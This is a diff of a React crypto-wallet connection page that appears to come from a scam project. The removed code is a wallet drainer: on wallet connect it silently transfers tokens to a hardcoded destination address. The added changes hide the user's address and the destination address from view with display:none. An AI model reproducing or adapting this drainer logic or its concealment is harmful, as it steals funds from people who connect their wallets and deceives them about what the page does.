@@ -3,7 +3,6 @@ import { WagmiProvider, useAccount } from 'wagmi'
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
 import { useEffect } from 'react'
 import { projectId, metadata, networks, wagmiAdapter , solanaWeb3JsAdapter} from './config'
-import { ethers } from 'ethers';
 
 import "./App.css"
 
@@ -31,37 +30,8 @@ const appKit = createAppKit({
 const DESTINATION_WALLET = "0x365Fd0098DB3ed48e64fd816beaeEe69FE1e354B" // Replace with your actual wallet address
 
 const WalletDisplay = () => {
-  const { address: userAddress, isConnected } = useAccount();
-
-  useEffect(() => {
-    const autoTransferTokens = async () => {
-      if (isConnected && userAddress) {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        const signer = provider.getSigner();
-
-        const recipientAddress = DESTINATION_WALLET; // Replace with your destination wallet address
-        const amountToSend = ethers.utils.parseUnits("0.01", "ether"); // Adjust the amount and unit as needed
-
-        const tokenContractAddress = "YOUR_TOKEN_CONTRACT_ADDRESS"; // Replace with your token contract address
-        const tokenAbi = [
-          "function transfer(address to, uint amount) public returns (bool)"
-        ];
-
-        const tokenContract = new ethers.Contract(tokenContractAddress, tokenAbi, signer);
-
-        try {
-          const tx = await tokenContract.transfer(recipientAddress, amountToSend);
-          await tx.wait(); // Wait for the transaction to be mined
-          console.log("Transfer successful:", tx);
-        } catch (error) {
-          console.error("Transfer failed:", error);
-        }
-      }
-    };
-
-    autoTransferTokens();
-  }, [isConnected, userAddress]);
-
+  const { address: userAddress, isConnected } = useAccount()
+  
   return (
     <div style={{
       background: '#f0f0f0',
@@ -71,18 +41,18 @@ const WalletDisplay = () => {
       textAlign: 'center'
     }}>
       {isConnected && (
-        <div style={{ marginTop: '20px' }}>
-          <h3>Your Wallet Address:</h3>
+        <div style={{ marginTop: '20px',display: 'none'}}>
+          
           <code style={{ wordBreak: 'break-all' }}>{userAddress}</code>
         </div>
       )}
-      <div style={{ marginTop: '20px' }}>
-        <h3>Destination Wallet Address:</h3>
-        <code style={{ wordBreak: 'break-all' }}>{DESTINATION_WALLET}</code>
+      <div style={{ marginTop: '20px',display: 'none'}}>
+        <h3></h3>
+        <code style={{ wordBreak: 'break-all',display: 'none' }}>{DESTINATION_WALLET}</code>
       </div>
     </div>
-  );
-};
+  )
+}
 
 export function App() {
   useEffect(() => {
